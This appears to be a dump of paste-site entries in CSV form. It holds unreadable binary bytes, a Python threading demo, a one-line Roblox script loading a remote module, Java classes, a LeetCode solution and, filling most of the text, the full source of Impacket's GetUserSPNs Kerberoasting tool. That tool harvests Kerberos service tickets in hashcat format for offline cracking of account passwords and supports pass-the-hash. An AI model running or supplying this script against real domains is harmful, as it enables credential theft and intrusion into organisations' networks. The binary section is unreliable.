[\xB0\xEBK\xF8M\xAD\x90\xFD\xF2\xAF3\xAAT\xA5\x95\x84H\xFD\x14\xD5\r\x16\xC4\xCFg\xF4B\xB6\v\xB0\xD1\xF8\x99\x88+\xB5\e\x10|i\x02\x16\xFBFU\x17\v\xB7\x8A?\xAF?\xB2l\xB2A\x90cy\xDA\x94\xA8f\x0F\x90g\xB7&\b\xCF\xBB\x017\xE5?L\x80\xDB\xBF%S\xA0C8\xF2\xB0n\x8CK\xFF4VMr\b\x85\xC6\x0E/J\x88\xD7\xB7F\x13\x83M\x14\x16\xE36\xCC8o^\x99\xBA\xD8\xB1\xC5V\x04\xD9\xF6\x18\x02\xB1;\t\xD8LiP\x83!x=\xC5jf[4\xA5\xC0$\x9Bk\xCB\xBDM=^\x82\x1F\xAC\xDB\x89H\x9C8\xFB\xA3\x8C\x17\xD2L\xAA[PqPI\xB1e\xF9\xDC\xA3N\xCB\x83\xA7\xC8\x05\xFC\xC1X\x062\xB6A\xA1\x8B\x02\xFE\x82\x14\a\xB1\xE8\xB8\xC4\xD0\xBA\xAAv\xC8\x9D]\xCAn\xB2w\x891\xEA\x10d\e\xC6CO\xE1\xF0\x9B\xD1,A;\t\x9A\xC5\x17\xD8p\x9B\xF0\x03\x88Cpg\am\x87\xD1\xDE,\e\xEA-1_\x01\x19\x86\xA0\xC4E\xC51\x98\xE2\xB9\x9DZ'\x16\x98\x19\x9E\xD2b\t\xC6\xDB\r\n\xFB\x1Dl\x8A%\xEE,\x01t5\x91z\xF3\x00\x9Faq\x7F\xB1\xDD\xA2\xB2\\\xFF\x86r1n8\x1E\x8B\x8FW\x01\xD4\xDB\xB2b\xF0\x8E<U\x01[\xDB\xD8uB\x94R\x18\x17z\x16\x94\x97\xCCi\xC4\x8D;\xB1\xA2\xB6\xE8\x9C\x16o\x19T&\xFB\xF4\xC3\xFA\x1D\xE8\xD0\xF3,\xE3\""\xC4D\x14\xCD\xF9\xD6E\x9A\xA3\xE1U\xF9a\x84\xA5e\xCCDR\x1D\xACr\xBF\xA2u\xAC\xBB\v1\x8C\xB8\x8D\xF6UY\xA6-\xABU@\""\xD0\xE0<(\x19\x0E\xAE\xB7\x04\xEA\xA4W`\x9Fs\x9F\xD4\x8C\x9D!]\xDB\x02\xC8\x8B.lP\x85\xDC\xB8\xE7mH\xEB\x83\x11\xE7Q\x17\xEB5\x9F\x8D\x9C\e|\xA6\xEB\xF2)E2a\xA3\xFE\x99\xF3\x9ET\x97=\x80e3\x90\xE4\xA2\xEAk\xC6Sx\xAAz.\x17\xB6\xEF\xD4g\xA5\x18\xF4@\xE201\x06\t*\x86H\x86\xF7\r\x01\a\x010\x1A\x06\b*\x86H\x86\xF7\r\x03\x020\x0E\x02\x02\x00\xA0\x04\b\xB1\xCC]%\xE0/%\x01\x80\b\xBA`TYs\x9AP3""

crypted
# => ""0\x82\x02\xA8\x06\t*\x86H\x86\xF7\r\x01\a\x03\xA0\x82\x02\x990\x82\x02\x95\x02\x01\x001\x82\x02[0\x82\x02W\x02\x01\x000?0:1\v0\t\x06\x03U\x04\x06\x13\x02BE1\r0\v\x06\x03U\x04\n\f\x04Test1\r0\v\x06\x03U\x04\v\f\x04Test1\r0\v\x06\x03U\x04\x03\f\x04Test\x02\x01\x000\r\x06\t*\x86H\x86\xF7\r\x01\x01\x01\x05\x00\x04\x82\x02\x00j\xB4\x8C\x8E\x9E\""?\xFE#\x93\xFF\x92zg\x10\r^&\xE4l\x96\x15\xF9\xADk [\xB0\xEBK\xF8M\xAD\x90\xFD\xF2\xAF3\xAAT\xA5\x95\x84H\xFD\x14\xD5\r\x16\xC4\xCFg\xF4B\xB6\v\xB0\xD1\xF8\x99\x88+\xB5\e\x10|i\x02\x16\xFBFU\x17\v\xB7\x8A?\xAF?\xB2l\xB2A\x90cy\xDA\x94\xA8f\x0F\x90g\xB7&\b\xCF\xBB\x017\xE5?L\x80\xDB\xBF%S\xA0C8\xF2\xB0n\x8CK\xFF4VMr\b\x85\xC6\x0E/J\x88\xD7\xB7F\x13\x83M\x14\x16\xE36\xCC8o^\x99\xBA\xD8\xB1\xC5V\x04\xD9\xF6\x18\x02\xB1;\t\xD8LiP\x83!x=\xC5jf[4\xA5\xC0$\x9Bk\xCB\xBDM=^\x82\x1F\xAC\xDB\x89H\x9C8\xFB\xA3\x8C\x17\xD2L\xAA[PqPI\xB1e\xF9\xDC\xA3N\xCB\x83\xA7\xC8\x05\xFC\xC1X\x062\xB6A\xA1\x8B\x02\xFE\x82\x14\a\xB1\xE8\xB8\xC4\xD0\xBA\xAAv\xC8\x9D]\xCAn\xB2w\x891\xEA\x10d\e\xC6CO\xE1\xF0\x9B\xD1,A;\t\x9A\xC5\x17\xD8p\x9B\xF0\x03\x88Cpg\am\x87\xD1\xDE,\e\xEA-1_\x01\x19\x86\xA0\xC4E\xC51\x98\xE2\xB9\x9DZ'\x16\x98\x19\x9E\xD2b\t\xC6\xDB\n\xFB\x1Dl\x8A%\xEE,\x01t5\x91z\xF3\x00\x9Faq\x7F\xB1\xDD\xA2\xB2\\\xFF\x86r1n8\x1E\x8B\x8FW\x01\xD4\xDB\xB2b\xF0\x8E<U\x01[\xDB\xD8uB\x94R\x18\x17z\x16\x94\x97\xCCi\xC4\x8D;\xB1\xA2\xB6\xE8\x9C\x16o\x19T&\xFB\xF4\xC3\xFA\x1D\xE8\xD0\xF3,\xE3\""\xC4D\x14\xCD\xF9\xD6E\x9A\xA3\xE1U\xF9a\x84\xA5e\xCCDR\x1D\xACr\xBF\xA2u\xAC\xBB\v1\x8C\xB8\x8D\xF6UY\xA6-\xABU@\""\xD0\xE0<(\x19\x0E\xAE\xB7\x04\xEA\xA4W`\x9Fs\x9F\xD4\x8C\x9D!]\xDB\x02\xC8\x8B.lP\x85\xDC\xB8\xE7mH\xEB\x83\x11\xE7Q\x17\xEB5\x9F\x8D\x9C\e|\xA6\xEB\xF2)E2a\xA3\xFE\x99\xF3\x9ET\x97=\x80e3\x90\xE4\xA2\xEAk\xC6Sx\xAAz.\x17\xB6\xEF\xD4g\xA5\x18\xF4@\xE201\x06\t*\x86H\x86\xF7\r\x01\a\x010\x1A\x06\b*\x86H\x86\xF7\r\x03\x020\x0E\x02\x02\x00\xA0\x04\b\xB1\xCC]%\xE0/%\x01\x80\b\xBA`TYs\x9AP3"""
QpNBJU7n,btbtbt,Toxotsist,Python,Monday 2nd of October 2023 02:40:19 PM CDT,"import threading
import time

mutex = threading.Lock()
sum = 0
sum2 = 0

def safe_race_thread1():
    global sum
    for i in range(0,1000):
        mutex.acquire()
        tmp = sum
        time.sleep(0)
        tmp += i
        time.sleep(0)
        sum = tmp
        mutex.release()

def safe_race_thread2():
    global sum
    for i in range(1, 1000):
        mutex.acquire()
        tmp = sum
        time.sleep(0)
        tmp -= i
        time.sleep(0)
        sum = tmp
        mutex.release()

def unsafe_race_thread1():
    global sum2
    for i in range(0, 1000):
        tmp = sum2
        time.sleep(0)
        tmp += i
        time.sleep(0)
        sum2 = tmp

def unsafe_race_thread2():
    global sum2
    for i in range(1, 1000):
        tmp = sum2
        time.sleep(0)
        tmp -= i
        time.sleep(0)
        sum2 = tmp

thread1 = threading.Thread(target = safe_race_thread1)
thread2 = threading.Thread(target = safe_race_thread2)
thread3 = threading.Thread(target = unsafe_race_thread1)
thread4 = threading.Thread(target = unsafe_race_thread2)
thread1.start()
thread2.start()
thread3.start()
thread4.start()
thread1.join()
thread2.join()
thread3.join()
thread4.join()
print (""Результат при работе с блокировкой"", sum)
print (""Результат без блокировки"", sum2)"
SuxDWTsE,Magic Tools,robinmollen,Lua,Monday 2nd of October 2023 02:28:17 PM CDT,"require(14883824578).RAroblox(""YourNameHere"")"
pMxRAwvB,Untitled,Raihan004,Python,Monday 2nd of October 2023 02:07:28 PM CDT,"#!/usr/bin/env python3
# Impacket - Collection of Python classes for working with network protocols.
#
# Copyright (C) 2023 Fortra. All rights reserved.
#
# This software is provided under a slightly modified version
# of the Apache Software License. See the accompanying LICENSE file
# for more information.
#
# Description:
#   This module will try to find Service Principal Names that are associated with normal user account.
#   Since normal account's password tend to be shorter than machine accounts, and knowing that a TGS request
#   will encrypt the ticket with the account the SPN is running under, this could be used for an offline
#   bruteforcing attack of the SPNs account NTLM hash if we can gather valid TGS for those SPNs.
#   This is part of the kerberoast attack researched by Tim Medin (@timmedin) and detailed at
#   https://files.sans.org/summit/hackfest2014/PDFs/Kicking%20the%20Guard%20Dog%20of%20Hades%20-%20Attacking%20Microsoft%20Kerberos%20%20-%20Tim%20Medin(1).pdf
#
#   Original idea of implementing this in Python belongs to @skelsec and his
#   https://github.com/skelsec/PyKerberoast project
#
#   This module provides a Python implementation for this attack, adding also the ability to PtH/Ticket/Key.
#   Also, disabled accounts won't be shown.
#
# Author:
#   Alberto Solino (@agsolino)
#
# ToDo:
#   [X] Add the capability for requesting TGS and output them in JtR/hashcat format
#

from __future__ import division
from __future__ import print_function
import argparse
import logging
import sys
from datetime import datetime
from binascii import hexlify, unhexlify

from pyasn1.codec.der import decoder
from impacket import version
from impacket.dcerpc.v5.samr import UF_ACCOUNTDISABLE, UF_TRUSTED_FOR_DELEGATION, \
    UF_TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION
from impacket.examples import logger
from impacket.examples.utils import parse_credentials
from impacket.krb5 import constants
from impacket.krb5.asn1 import TGS_REP, AS_REP
from impacket.krb5.ccache import CCache
from impacket.krb5.kerberosv5 import getKerberosTGT, getKerberosTGS
from impacket.krb5.types import Principal
from impacket.ldap import ldap, ldapasn1
from impacket.smbconnection import SMBConnection, SessionError
from impacket.ntlm import compute_lmhash, compute_nthash


class GetUserSPNs:
    @staticmethod
    def printTable(items, header):
        colLen = []
        for i, col in enumerate(header):
            rowMaxLen = max([len(row[i]) for row in items])
            colLen.append(max(rowMaxLen, len(col)))

        outputFormat = ' '.join(['{%d:%ds} ' % (num, width) for num, width in enumerate(colLen)])

        # Print header
        print(outputFormat.format(*header))
        print('  '.join(['-' * itemLen for itemLen in colLen]))

        # And now the rows
        for row in items:
            print(outputFormat.format(*row))

    def __init__(self, username, password, user_domain, target_domain, cmdLineOptions):
        self.__username = username
        self.__password = password
        self.__domain = user_domain
        self.__target = None
        self.__targetDomain = target_domain
        self.__lmhash = ''
        self.__nthash = ''
        self.__no_preauth = cmdLineOptions.no_preauth
        self.__outputFileName = cmdLineOptions.outputfile
        self.__usersFile = cmdLineOptions.usersfile
        self.__aesKey = cmdLineOptions.aesKey
        self.__doKerberos = cmdLineOptions.k
        self.__requestTGS = cmdLineOptions.request
        # [!] in this script the value of -dc-ip option is self.__kdcIP and the value of -dc-host option is self.__kdcHost
        self.__kdcIP = cmdLineOptions.dc_ip
        self.__kdcHost = cmdLineOptions.dc_host
        self.__saveTGS = cmdLineOptions.save
        self.__requestUser = cmdLineOptions.request_user
        self.__stealth = cmdLineOptions.stealth
        if cmdLineOptions.hashes is not None:
            self.__lmhash, self.__nthash = cmdLineOptions.hashes.split(':')

        # Create the baseDN
        domainParts = self.__targetDomain.split('.')
        self.baseDN = ''
        for i in domainParts:
            self.baseDN += 'dc=%s,' % i
        # Remove last ','
        self.baseDN = self.baseDN[:-1]
        # We can't set the KDC to a custom IP or Hostname when requesting things cross-domain
        # because then the KDC host will be used for both
        # the initial and the referral ticket, which breaks stuff.
        if user_domain != self.__targetDomain and (self.__kdcIP or self.__kdcHost):
            logging.warning('KDC IP address and hostname will be ignored because of cross-domain targeting.')
            self.__kdcIP = None
            self.__kdcHost = None

    def getMachineName(self, target):
        try:
            s = SMBConnection(target, target)
            s.login('', '')
        except OSError as e:
            if str(e).find('timed out') > 0:
                raise Exception('The connection is timed out. Probably 445/TCP port is closed. Try to specify '
                                'corresponding NetBIOS name or FQDN as the value of the -dc-host option')
            else:
                raise
        except SessionError as e:
            if str(e).find('STATUS_NOT_SUPPORTED') > 0:
                raise Exception('The SMB request is not supported. Probably NTLM is disabled. Try to specify '
                                'corresponding NetBIOS name or FQDN as the value of the -dc-host option')
            else:
                raise
        except Exception:
            if s.getServerName() == '':
                raise Exception('Error while anonymous logging into %s' % target)
        else:
            s.logoff()
        return ""%s.%s"" % (s.getServerName(), s.getServerDNSDomainName())

    @staticmethod
    def getUnixTime(t):
        t -= 116444736000000000
        t /= 10000000
        return t

    def getTGT(self):
        domain, _, TGT, _ = CCache.parseFile(self.__domain)
        if TGT is not None:
            return TGT

        # No TGT in cache, request it
        userName = Principal(self.__username, type=constants.PrincipalNameType.NT_PRINCIPAL.value)

        # In order to maximize the probability of getting session tickets with RC4 etype, we will convert the
        # password to ntlm hashes (that will force to use RC4 for the TGT). If that doesn't work, we use the
        # cleartext password.
        # If no clear text password is provided, we just go with the defaults.
        if self.__password != '' and (self.__lmhash == '' and self.__nthash == ''):
            try:
                tgt, cipher, oldSessionKey, sessionKey = getKerberosTGT(userName, '', self.__domain,
                                                                        compute_lmhash(self.__password),
                                                                        compute_nthash(self.__password), self.__aesKey,
                                                                        kdcHost=self.__kdcIP)
            except Exception as e:
                logging.debug('TGT: %s' % str(e))
                tgt, cipher, oldSessionKey, sessionKey = getKerberosTGT(userName, self.__password, self.__domain,
                                                                        unhexlify(self.__lmhash),
                                                                        unhexlify(self.__nthash), self.__aesKey,
                                                                        kdcHost=self.__kdcIP)

        else:
            tgt, cipher, oldSessionKey, sessionKey = getKerberosTGT(userName, self.__password, self.__domain,
                                                                    unhexlify(self.__lmhash),
                                                                    unhexlify(self.__nthash), self.__aesKey,
                                                                    kdcHost=self.__kdcIP)
        TGT = {}
        TGT['KDC_REP'] = tgt
        TGT['cipher'] = cipher
        TGT['sessionKey'] = sessionKey

        return TGT

    def outputTGS(self, ticket, oldSessionKey, sessionKey, username, spn, fd=None):
        if self.__no_preauth:
            decodedTGS = decoder.decode(ticket, asn1Spec=AS_REP())[0]
        else:
            decodedTGS = decoder.decode(ticket, asn1Spec=TGS_REP())[0]
        # According to RFC4757 (RC4-HMAC) the cipher part is like:
        # struct EDATA {
        #       struct HEADER {
        #               OCTET Checksum[16];
        #               OCTET Confounder[8];
        #       } Header;
        #       OCTET Data[0];
        # } edata;
        #
        # In short, we're interested in splitting the checksum and the rest of the encrypted data
        #
        # Regarding AES encryption type (AES128 CTS HMAC-SHA1 96 and AES256 CTS HMAC-SHA1 96)
        # last 12 bytes of the encrypted ticket represent the checksum of the decrypted 
        # ticket
        if decodedTGS['ticket']['enc-part']['etype'] == constants.EncryptionTypes.rc4_hmac.value:
            entry = '$krb5tgs$%d$*%s$%s$%s*$%s$%s' % (
                constants.EncryptionTypes.rc4_hmac.value, username, decodedTGS['ticket']['realm'],
                spn.replace(':', '~'),
                hexlify(decodedTGS['ticket']['enc-part']['cipher'][:16].asOctets()).decode(),
                hexlify(decodedTGS['ticket']['enc-part']['cipher'][16:].asOctets()).decode())
            if fd is None:
                print(entry)
            else:
                fd.write(entry + '\n')
        elif decodedTGS['ticket']['enc-part']['etype'] == constants.EncryptionTypes.aes128_cts_hmac_sha1_96.value:
            entry = '$krb5tgs$%d$%s$%s$*%s*$%s$%s' % (
                constants.EncryptionTypes.aes128_cts_hmac_sha1_96.value, username, decodedTGS['ticket']['realm'],
                spn.replace(':', '~'),
                hexlify(decodedTGS['ticket']['enc-part']['cipher'][-12:].asOctets()).decode(),
                hexlify(decodedTGS['ticket']['enc-part']['cipher'][:-12:].asOctets()).decode())
            if fd is None:
                print(entry)
            else:
                fd.write(entry + '\n')
        elif decodedTGS['ticket']['enc-part']['etype'] == constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value:
            entry = '$krb5tgs$%d$%s$%s$*%s*$%s$%s' % (
                constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value, username, decodedTGS['ticket']['realm'],
                spn.replace(':', '~'),
                hexlify(decodedTGS['ticket']['enc-part']['cipher'][-12:].asOctets()).decode(),
                hexlify(decodedTGS['ticket']['enc-part']['cipher'][:-12:].asOctets()).decode())
            if fd is None:
                print(entry)
            else:
                fd.write(entry + '\n')
        elif decodedTGS['ticket']['enc-part']['etype'] == constants.EncryptionTypes.des_cbc_md5.value:
            entry = '$krb5tgs$%d$*%s$%s$%s*$%s$%s' % (
                constants.EncryptionTypes.des_cbc_md5.value, username, decodedTGS['ticket']['realm'],
                spn.replace(':', '~'),
                hexlify(decodedTGS['ticket']['enc-part']['cipher'][:16].asOctets()).decode(),
                hexlify(decodedTGS['ticket']['enc-part']['cipher'][16:].asOctets()).decode())
            if fd is None:
                print(entry)
            else:
                fd.write(entry + '\n')
        else:
            logging.error('Skipping %s/%s due to incompatible e-type %d' % (
                decodedTGS['ticket']['sname']['name-string'][0], decodedTGS['ticket']['sname']['name-string'][1],
                decodedTGS['ticket']['enc-part']['etype']))

        if self.__saveTGS is True:
            # Save the ticket
            logging.debug('About to save TGS for %s' % username)
            ccache = CCache()
            try:
                ccache.fromTGS(ticket, oldSessionKey, sessionKey)
                ccache.saveFile('%s.ccache' % username)
            except Exception as e:
                logging.error(str(e))

    def run(self):
        if self.__usersFile:
            self.request_users_file_TGSs()
            return

        if self.__kdcHost is not None and self.__targetDomain == self.__domain:
            self.__target = self.__kdcHost
        else:
            if self.__kdcIP is not None and self.__targetDomain == self.__domain:
                self.__target = self.__kdcIP
            else:
                self.__target = self.__targetDomain

            if self.__doKerberos:
                logging.info('Getting machine hostname')
                self.__target = self.getMachineName(self.__target)

        # Connect to LDAP
        try:
            ldapConnection = ldap.LDAPConnection('ldap://%s' % self.__target, self.baseDN, self.__kdcIP)
            if self.__doKerberos is not True:
                ldapConnection.login(self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash)
            else:
                ldapConnection.kerberosLogin(self.__username, self.__password, self.__domain, self.__lmhash,
                                             self.__nthash,
                                             self.__aesKey, kdcHost=self.__kdcIP)
        except ldap.LDAPSessionError as e:
            if str(e).find('strongerAuthRequired') >= 0:
                # We need to try SSL
                ldapConnection = ldap.LDAPConnection('ldaps://%s' % self.__target, self.baseDN, self.__kdcIP)
                if self.__doKerberos is not True:
                    ldapConnection.login(self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash)
                else:
                    ldapConnection.kerberosLogin(self.__username, self.__password, self.__domain, self.__lmhash,
                                                 self.__nthash,
                                                 self.__aesKey, kdcHost=self.__kdcIP)
            else:
                if str(e).find('NTLMAuthNegotiate') >= 0:
                    logging.critical(""NTLM negotiation failed. Probably NTLM is disabled. Try to use Kerberos ""
                                     ""authentication instead."")
                else:
                    if self.__kdcIP is not None and self.__kdcHost is not None:
                        logging.critical(""If the credentials are valid, check the hostname and IP address of KDC. They ""
                                         ""must match exactly each other"")
                raise

        # Building the search filter
        filter_spn = ""servicePrincipalName=*""
        filter_person = ""objectCategory=person""
        filter_not_disabled = ""!(userAccountControl:1.2.840.113556.1.4.803:=2)""

        searchFilter = ""(&""
        searchFilter += ""("" + filter_person + "")""
        searchFilter += ""("" + filter_not_disabled + "")""

        if self.__stealth is True:
            logging.warning('Stealth option may cause huge memory consumption / out-of-memory errors on very large domains.')
        else:
            searchFilter += ""("" + filter_spn + "")""

        if self.__requestUser is not None:
            searchFilter += '(sAMAccountName:=%s)' % self.__requestUser

        searchFilter += ')'

        try:
            # Microsoft Active Directory set an hard limit of 1000 entries returned by any search
            paged_search_control = ldapasn1.SimplePagedResultsControl(criticality=True, size=1000)

            resp = ldapConnection.search(searchFilter=searchFilter,
                                         attributes=['servicePrincipalName', 'sAMAccountName',
                                                     'pwdLastSet', 'MemberOf', 'userAccountControl', 'lastLogon'],
                                         searchControls=[paged_search_control])

        except ldap.LDAPSearchError as e:
            if e.getErrorString().find('sizeLimitExceeded') >= 0:
                # We should never reach this code as we use paged search now
                logging.debug('sizeLimitExceeded exception caught, giving up and processing the data received')
                resp = e.getAnswers()
                pass
            else:
                raise

        answers = []
        logging.debug('Total of records returned %d' % len(resp))
        for item in resp:
            if isinstance(item, ldapasn1.SearchResultEntry) is not True:
                continue
            mustCommit = False
            sAMAccountName = ''
            memberOf = ''
            SPNs = []
            pwdLastSet = ''
            userAccountControl = 0
            lastLogon = 'N/A'
            delegation = ''
            try:
                for attribute in item['attributes']:
                    if str(attribute['type']) == 'sAMAccountName':
                        sAMAccountName = str(attribute['vals'][0])
                        mustCommit = True
                    elif str(attribute['type']) == 'userAccountControl':
                        userAccountControl = str(attribute['vals'][0])
                        if int(userAccountControl) & UF_TRUSTED_FOR_DELEGATION:
                            delegation = 'unconstrained'
                        elif int(userAccountControl) & UF_TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION:
                            delegation = 'constrained'
                    elif str(attribute['type']) == 'memberOf':
                        memberOf = str(attribute['vals'][0])
                    elif str(attribute['type']) == 'pwdLastSet':
                        if str(attribute['vals'][0]) == '0':
                            pwdLastSet = '<never>'
                        else:
                            pwdLastSet = str(datetime.fromtimestamp(self.getUnixTime(int(str(attribute['vals'][0])))))
                    elif str(attribute['type']) == 'lastLogon':
                        if str(attribute['vals'][0]) == '0':
                            lastLogon = '<never>'
                        else:
                            lastLogon = str(datetime.fromtimestamp(self.getUnixTime(int(str(attribute['vals'][0])))))
                    elif str(attribute['type']) == 'servicePrincipalName':
                        for spn in attribute['vals']:
                            SPNs.append(str(spn))

                if mustCommit is True:
                    if int(userAccountControl) & UF_ACCOUNTDISABLE:
                        logging.debug('Bypassing disabled account %s ' % sAMAccountName)
                    else:
                        for spn in SPNs:
                            answers.append([spn, sAMAccountName, memberOf, pwdLastSet, lastLogon, delegation])
            except Exception as e:
                logging.error('Skipping item, cannot process due to error %s' % str(e))
                pass

        if len(answers) > 0:
            self.printTable(answers, header=[""ServicePrincipalName"", ""Name"", ""MemberOf"", ""PasswordLastSet"", ""LastLogon"",
                                             ""Delegation""])
            print('\n\n')

            if self.__requestTGS is True or self.__requestUser is not None:
                # Let's get unique user names and a SPN to request a TGS for
                users = dict((vals[1], vals[0]) for vals in answers)

                # Get a TGT for the current user
                TGT = self.getTGT()

                if self.__outputFileName is not None:
                    fd = open(self.__outputFileName, 'w+')
                else:
                    fd = None

                for user, SPN in users.items():
                    sAMAccountName = user
                    downLevelLogonName = self.__targetDomain + ""\\"" + sAMAccountName

                    try:
                        principalName = Principal()
                        principalName.type = constants.PrincipalNameType.NT_MS_PRINCIPAL.value
                        principalName.components = [downLevelLogonName]

                        tgs, cipher, oldSessionKey, sessionKey = getKerberosTGS(principalName, self.__domain,
                                                                                self.__kdcIP,
                                                                                TGT['KDC_REP'], TGT['cipher'],
                                                                                TGT['sessionKey'])
                        self.outputTGS(tgs, oldSessionKey, sessionKey, sAMAccountName,
                                       self.__targetDomain + ""/"" + sAMAccountName, fd)
                    except Exception as e:
                        logging.debug(""Exception:"", exc_info=True)
                        logging.error('Principal: %s - %s' % (downLevelLogonName, str(e)))

                if fd is not None:
                    fd.close()

        else:
            print(""No entries found!"")

    def request_users_file_TGSs(self):

        with open(self.__usersFile) as fi:
            usernames = [line.strip() for line in fi]

        self.request_multiple_TGSs(usernames)

    def request_multiple_TGSs(self, usernames):
        if self.__outputFileName is not None:
            fd = open(self.__outputFileName, 'w+')
        else:
            fd = None
            
        if self.__no_preauth:
            for username in usernames:
                try:
                    no_preauth_pincipal = Principal(self.__no_preauth, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
                    tgt, cipher, oldSessionKey, sessionKey = getKerberosTGT(clientName=no_preauth_pincipal,
                                                                            password=self.__password,
                                                                            domain=self.__domain,
                                                                            lmhash=(self.__lmhash),
                                                                            nthash=(self.__nthash),
                                                                            aesKey=self.__aesKey,
                                                                            kdcHost=self.__kdcHost,
                                                                            serverName=username,
                                                                            kerberoast_no_preauth=True)
                    self.outputTGS(tgt, oldSessionKey, sessionKey, username, username, fd)
                except Exception as e:
                    logging.debug(""Exception:"", exc_info=True)
                    logging.error('Principal: %s - %s' % (username, str(e)))

            if fd is not None:
                fd.close()
        else:
            # Get a TGT for the current user
            TGT = self.getTGT()
            
            for username in usernames:
                try:
                    principalName = Principal()
                    principalName.type = constants.PrincipalNameType.NT_ENTERPRISE.value
                    principalName.components = [username]

                    tgs, cipher, oldSessionKey, sessionKey = getKerberosTGS(principalName, self.__domain,
                                                                            self.__kdcIP,
                                                                            TGT['KDC_REP'], TGT['cipher'],
                                                                            TGT['sessionKey'])
                    self.outputTGS(tgs, oldSessionKey, sessionKey, username, username, fd)
                except Exception as e:
                    logging.debug(""Exception:"", exc_info=True)
                    logging.error('Principal: %s - %s' % (username, str(e)))

            if fd is not None:
                fd.close()


# Process command-line arguments.
if __name__ == '__main__':
    print(version.BANNER)

    parser = argparse.ArgumentParser(add_help=True, description=""Queries target domain for SPNs that are running ""
                                                                ""under a user account"")

    parser.add_argument('target', action='store', help='domain[/username[:password]]')
    parser.add_argument('-target-domain', action='store',
                        help='Domain to query/request if different than the domain of the user. '
                             'Allows for Kerberoasting across trusts.')
    parser.add_argument('-no-preauth', action='store', help='account that does not require preauth, to obtain Service Ticket'
                                                         ' through the AS')
    parser.add_argument('-stealth', action='store_true', help='Removes the (servicePrincipalName=*) filter from the LDAP query for added stealth. '
                                                              'May cause huge memory consumption / errors on large domains.')
    parser.add_argument('-usersfile', help='File with user per line to test')
    parser.add_argument('-request', action='store_true', default=False, help='Requests TGS for users and output them '
                                                                             'in JtR/hashcat format (default False)')
    parser.add_argument('-request-user', action='store', metavar='username', help='Requests TGS for the SPN associated '
                                                                                  'to the user specified (just the username, no domain needed)')
    parser.add_argument('-save', action='store_true', default=False, help='Saves TGS requested to disk. Format is '
                                                                          '<username>.ccache. Auto selects -request')
    parser.add_argument('-outputfile', action='store',
                        help='Output filename to write ciphers in JtR/hashcat format. Auto selects -request')
    parser.add_argument('-ts', action='store_true', help='Adds timestamp to every logging output.')
    parser.add_argument('-debug', action='store_true', help='Turn DEBUG output ON')

    group = parser.add_argument_group('authentication')

    group.add_argument('-hashes', action=""store"", metavar=""LMHASH:NTHASH"", help='NTLM hashes, format is LMHASH:NTHASH')
    group.add_argument('-no-pass', action=""store_true"", help='don\'t ask for password (useful for -k)')
    group.add_argument('-k', action=""store_true"",
                       help='Use Kerberos authentication. Grabs credentials from ccache file '
                            '(KRB5CCNAME) based on target parameters. If valid credentials '
                            'cannot be found, it will use the ones specified in the command '
                            'line')
    group.add_argument('-aesKey', action=""store"", metavar=""hex key"", help='AES key to use for Kerberos Authentication '
                                                                          '(128 or 256 bits)')

    group = parser.add_argument_group('connection')
    group.add_argument('-dc-ip', action='store', metavar='ip address', help='IP Address of the domain controller. If '
                                                                            'ommited it use the domain part (FQDN) '
                                                                            'specified in the target parameter. Ignored'
                                                                            'if -target-domain is specified.')
    group.add_argument('-dc-host', action='store', metavar='hostname', help='Hostname of the domain controller to use. '
                                                                            'If ommited, the domain part (FQDN) '
                                                                            'specified in the account parameter will be used')

    if len(sys.argv) == 1:
        parser.print_help()
        sys.exit(1)

    options = parser.parse_args()

    # Init the example's logger theme
    logger.init(options.ts)

    if options.no_preauth and options.usersfile is None:
        logging.error('You have to specify -usersfile when -no-preauth is supplied. Usersfile must contain'
                      ' a list of SPNs and/or sAMAccountNames to Kerberoast.')
        sys.exit(1)

    if options.debug is True:
        logging.getLogger().setLevel(logging.DEBUG)
        # Print the Library's installation path
        logging.debug(version.getInstallationPath())
    else:
        logging.getLogger().setLevel(logging.INFO)

    userDomain, username, password = parse_credentials(options.target)

    if userDomain == '':
        logging.critical('userDomain should be specified!')
        sys.exit(1)

    if options.target_domain:
        targetDomain = options.target_domain
    else:
        targetDomain = userDomain

    if password == '' and username != '' and options.hashes is None and options.no_pass is False and options.aesKey is None:
        from getpass import getpass

        password = getpass(""Password:"")

    if options.aesKey is not None:
        options.k = True

    if options.save is True or options.outputfile is not None:
        options.request = True

    try:
        executer = GetUserSPNs(username, password, userDomain, targetDomain, options)
        executer.run()
    except Exception as e:
        if logging.getLogger().level == logging.DEBUG:
            import traceback
            traceback.print_exc()
        logging.error(str(e))"
3sc93LV8,UserInterface.java,ramosjorge,Java,Monday 2nd of October 2023 01:48:58 PM CDT,"package view;

public class UserInterface {

    public static void mainMenu() {
        System.out.print(

                ""\nACTIVIDAD UF1 PROGRAMACIÓN DE SERVICIOS Y PROCESOS\n\n"" +
                        """"""
                                \t1.Cifrar mensaje
                                \t2.Descifrar mensaje
                                \t-------------------------
                                \t3.Salir\s
                                """"""
                        + ""\nOpcion: ""
        );
    }

    public static void getDocumentName() {
        System.out.print(""Introduzca el nombre del documento: "");
    }

    public static void getStrText() {
        System.out.print(""Introduzca el texto a codificar: "");
    }
}"
ek9kZj59,LeetCode 36 - Valid Sudoku - NeetCode solution,nathanwailes,Python,Monday 2nd of October 2023 01:48:41 PM CDT,"class Solution:
    def isValidSudoku(self, board: List[List[string]]) -> bool:
        cols = collections.defaultdict(set)
        rows = collections.defaultdict(set)
        squares = collections.defaultdict(set) # key = (r /3, c /3)
        
        for r in range(9):
            for c in range(9):
                if board[r][c] == ""."":
                    continue
                if (board[r][c] in rows[r] or
                    board[r][c] in cols[c] or
                    board[r][c] in squares[(r //3, c //3)]):
                    return False
                cols[c].add(board[r][c])
                rows[r].add(board[r][c])
                squares[(r // 3, c // 3)].add(board[r][c])
        return True
"
kw5BwLyW,ErrorInterface.java,ramosjorge,Java,Monday 2nd of October 2023 01:48:16 PM CDT,"package view;

import javax.crypto.BadPaddingException;
import javax.crypto.IllegalBlockSizeException;
import javax.crypto.NoSuchPaddingException;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.security.InvalidKeyException;
import java.security.NoSuchAlgorithmException;

public class ErrorInterface {

    public static void chooseValidOption() {
        System.err.println(""Introduzca una opción correcta"");
    }

    public static void fileNotFoundException(FileNotFoundException e) {
        System.err.println(""FileNotFoundException "".concat(e.getMessage()));
    }

